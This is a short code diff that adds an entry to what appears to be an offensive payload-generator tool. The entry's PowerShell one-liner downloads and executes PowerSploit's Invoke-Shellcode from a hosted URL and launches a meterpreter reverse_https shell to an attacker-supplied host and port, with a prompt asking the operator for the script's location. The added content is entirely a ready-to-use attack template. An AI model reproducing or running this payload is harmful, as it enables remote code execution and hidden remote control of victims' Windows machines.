@@ -171,6 +171,16 @@ Load({
 	}
 })
 
+Load({
+	title: "Remotely download and execute PowerSploit's Invoke-Shellcode",
+	payload: 'IEX (New-Object Net.WebClient).DownloadString("<PROMPT>");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <LHOST> -Lport <LPORT>',
+	category: "Powershell",
+	callback: function(bro){
+	    question("Enter the full path of your hosted copy of PowerSploit's Invoke-Shellcode script ")
+	    ask.some(questions, bro);
+	}
+})
+
 
 // ############### Windows Registry ######################
 
